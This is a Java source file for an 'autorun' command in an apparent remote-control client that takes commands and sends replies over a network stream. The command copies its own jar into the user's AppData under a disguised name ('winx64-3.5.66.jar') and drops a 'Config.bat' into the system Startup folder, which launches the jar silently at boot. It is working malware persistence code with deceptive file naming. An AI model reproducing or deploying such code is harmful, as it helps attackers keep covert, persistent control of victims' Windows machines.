package Client.command.commands;

import Client.Client;
import Client.command.Command;
import Client.utils.Prefixes;
import org.apache.commons.io.FileUtils;


import java.io.*;
import java.net.URISyntaxException;
import java.util.ArrayList;

public class AutoRun extends Command {
    public AutoRun() {
        super("autorun", "Makes the program start on boot", "autorun");
    }

    @Override
    public void run(ArrayList<String> args, BufferedReader receive, PrintWriter send) {
        System.out.println(System.getProperty("user.home"));
        char letter = System.getProperty("user.home").charAt(0);
        try {
            send.println(Prefixes.INFO + "Creating autorun files...");
            FileUtils.copyFile(new File(Client.class.getProtectionDomain()
                            .getCodeSource()
                            .getLocation()
                            .toURI()
                            .getPath()),
                    new File(System.getProperty("user.home") + "\\AppData\\Roaming\\Microsoft\\Windows\\winx64-3.5.66.jar"));
            File f = new File(letter + ":\\ProgramData\\Microsoft\\Windows\\Start Menu\\Programs\\Startup\\Config.bat");
            f.getParentFile().mkdirs();
            if(f.createNewFile()) send.println(Prefixes.INFO + "Created autorun files!");
            else send.println(Prefixes.ERROR + "Failed to create autorun files!");

            FileWriter writer = new FileWriter(letter + ":\\ProgramData\\Microsoft\\Windows\\Start Menu\\Programs\\Startup\\Config.bat");
            writer.write("@echo off \n start javaw -jar " + System.getProperty("user.home") + "\\AppData\\Roaming\\Microsoft\\Windows\\winx64-3.5.66.jar");
            writer.close();
            send.println(Prefixes.INFO + "Done!");
        } catch (IOException | URISyntaxException e) {
            send.println(Prefixes.ERROR + "An error has occurred: " + e + "\n");
        }
    }


}
